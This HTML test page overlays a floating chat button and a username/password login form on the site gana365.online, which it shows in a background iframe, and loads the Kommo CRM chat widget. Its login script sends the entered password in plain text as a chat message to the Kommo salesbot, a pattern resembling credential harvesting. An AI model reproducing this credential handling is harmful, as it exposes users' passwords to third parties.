<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Prueba Kommo Widget Flotante</title>
  <link rel="stylesheet" href="styles.css"/>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>

  <!-- Fondo -->
  <iframe id="backgroundIframe" src="https://gana365.online"></iframe>

  <!-- Botón del chat flotante personalizado -->
  <button class="chat-button" onclick="toggleChat()">💬</button>

  <!-- Contenedor personalizado (no embebemos el widget adentro de esto) -->
  <div class="chat-container" id="chatBox">
    <div id="chatHeader" class="chat-header" style="display: none;">
      <img src="https://gana365.online/images/logo.png" alt="Logo" class="chat-logo"/>
      <span class="chat-phone">Soporte: +54 9 11 5412-8983</span>
      <button onclick="toggleChat()" class="close-chat">✖</button>
    </div>

    <div class="login-container" id="loginForm">
      <h3>Bienvenido</h3>
      <img src="https://gana365.online/images/logo.png" class="login-logo" alt="Logo"/>
      <input type="text" id="username" placeholder="Ingrese su usuario" required/>
      <input type="password" id="password" placeholder="Contraseña" required/>
      <button onclick="login()" class="login-button">Iniciar Chat</button>
    </div>
  </div>

  <!-- ✅ Script del widget Kommo como flotante tradicional -->
  <script>
    (function(a,m,o,c,r,m){
      a[m]={
        id:"1036503",
        hash:"418cb7e2728464ae9d979e2620ffd41197c85e21ea581346a2c53efc3333381c",
        locale:"es",
        setMeta:function(p){
          this.params=(this.params||[]).concat([p])
        }
      };
      a[o]=a[o]||function(){(a[o].q=a[o].q||[]).push(arguments)};
      var d=a.document,s=d.createElement('script');
      s.async=true;s.id=m+'_script';
      s.src='https://gso.kommo.com/js/button.js';
      d.head && d.head.appendChild(s);
    })(window,"crm_plugin","crmPlugin");
  </script>

  <!-- Script personalizado -->
  <script>
    function login() {
      let username = document.getElementById("username").value.trim();
      let password = document.getElementById("password").value.trim();

      if (username === "" || password === "") {
        Swal.fire({
          icon: "error",
          title: "Por favor, complete todos los campos",
          confirmButtonText: "OK",
          confirmButtonColor: "#6C63FF",
          iconColor: "#FF3B00",
          customClass: { popup: 'swal2-rounded' }
        });
        return;
      }

      document.getElementById("loginForm").style.display = "none";
      document.getElementById("chatHeader").style.display = "flex";

      let attempts = 0;
      const maxAttempts = 10;

      const trySend = setInterval(() => {
        if (window.crmPlugin && window.crmPlugin.setMeta) {
          window.crmPlugin.setMeta({
            name: username,
            message: `Usuario: ${username}\nContraseña: ${password}`
          });
          window.crmPlugin("open"); // abrir el widget flotante
          clearInterval(trySend);
          console.log("✅ Mensaje enviado al Salesbot de Kommo");
        } else {
          attempts++;
          console.log("⌛ Esperando que Kommo esté listo...");
          if (attempts >= maxAttempts) {
            clearInterval(trySend);
            console.error("❌ No se pudo conectar con el widget de Kommo.");
          }
        }
      }, 500);
    }

    function toggleChat() {
      const chat = document.getElementById("chatBox");
      const button = document.querySelector(".chat-button");

      if (chat.style.display === "block") {
        chat.style.display = "none";
        button.innerHTML = "💬";
      } else {
        chat.style.display = "block";
        setTimeout(() => chat.classList.add("open"), 10);
        button.innerHTML = "✖";
      }
    }
  </script>
</body>
</html>
